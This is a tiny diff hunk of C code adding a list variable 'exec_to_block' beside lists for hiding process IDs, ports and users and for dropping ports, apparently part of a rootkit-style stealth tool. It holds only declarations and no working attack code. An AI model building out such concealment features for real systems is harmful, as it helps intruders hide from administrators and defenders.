@@ -20,6 +20,7 @@ list *pids_to_hide = NULL;
 list *ports_to_hide = NULL;
 list *users_to_hide = NULL;
 list *ports_to_drop = NULL;
+list *exec_to_block = NULL;
 
 
 /* function to insert node to structure at the end of the list,
